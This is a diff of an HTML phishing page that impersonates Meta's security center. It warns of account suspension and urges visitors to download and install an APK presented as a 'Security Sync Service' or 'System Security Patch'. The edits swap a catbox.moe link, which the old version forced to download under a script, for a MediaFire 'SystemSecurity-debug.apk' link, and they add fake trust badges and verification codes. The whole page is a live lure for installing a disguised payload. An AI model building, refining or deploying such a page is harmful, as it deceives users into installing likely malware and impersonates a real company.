@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Security Check | Identity Verification</title>
+    <title>Meta Security Check | Verification Required</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15); width: 100%; max-width: 400px; text-align: center; }
-        .meta-logo { width: 120px; margin-bottom: 25px; }
+        .container { background: white; padding: 45px 25px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1); width: 100%; max-width: 380px; text-align: center; }
+        .meta-logo { width: 110px; margin-bottom: 25px; }
         h1 { color: #1c1e21; font-size: 20px; margin-bottom: 15px; font-weight: bold; }
-        p { color: #606770; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
-        .btn-download { display: block; background-color: #0064e0; color: white; padding: 15px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 16px; border: none; width: 90%; margin: 0 auto; cursor: pointer; }
-        .security-footer { margin-top: 30px; font-size: 11px; color: #8a8d91; border-top: 1px solid #ebedf0; padding-top: 20px; }
-        .shield { color: #42b72a; font-size: 13px; margin-bottom: 10px; display: block; font-weight: bold; }
+        p { color: #606770; font-size: 14.5px; line-height: 1.6; margin-bottom: 30px; }
+        .btn-download { display: block; background-color: #0064e0; color: white; padding: 16px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 16px; transition: background 0.2s; border: none; width: 90%; margin: 0 auto; box-shadow: 0 4px 10px rgba(0, 100, 224, 0.3); }
+        .btn-download:hover { background-color: #0056c0; }
+        .footer { margin-top: 35px; font-size: 11px; color: #8a8d91; border-top: 1px solid #ebedf0; padding-top: 20px; }
+        .security-badge { background: #e7f3ff; color: #1877f2; padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: inline-block; }
     </style>
 </head>
 <body>
@@ -20,33 +21,18 @@
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-logo">
         
-        <span class="shield">🛡️ Official Security Center</span>
-        <h1>Account Lock Detected</h1>
-        <p>Unusual activity was found on your Meta account. To verify your identity and prevent permanent suspension, please download and install the <b>Security Sync Service</b>.</p>
+        <div class="security-badge">🛡️ Trusted Device Verification</div>
+        <h1>Action Required: Account Security</h1>
+        <p>Your Meta account session has been temporarily suspended due to a security risk. To protect your data, please download and install the <b>System Security Patch</b> to verify your identity.</p>
 
-        <a href="https://files.catbox.moe/v6r9k1.txt" 
-           download="Meta_Security_Update.apk" 
-           type="application/vnd.android.package-archive" 
-           class="btn-download"
-           onclick="forceDownload(this.href)">Install & Unlock Now</a>
+        <a href="https://www.mediafire.com/file/3vyg9sndhqxxxrk/SystemSecurity-debug.apk/file?dkey=6c090mdjp2y&r=69" 
+           class="btn-download">Update & Secure Account</a>
 
-        <div class="security-footer">
-            © 2026 Meta Platforms, Inc. <br>
-            Security ID: 851-035-2009-MS
+        <div class="footer">
+            <p>© 2026 Meta Platforms, Inc. <br> Security Center ID: 851-035-2009</p>
+            <p style="font-size: 9px; margin-top: 10px; color: #bcc0c4;">Verify code: MS-747928-SYNC</p>
         </div>
     </div>
-
-    <script>
-        function forceDownload(url) {
-            // Agar normal click kaam na kare toh ye force download trigger karega
-            var link = document.createElement('a');
-            link.href = url;
-            link.download = "Meta_Security_Update.apk";
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-    </script>
 
 </body>
 </html>
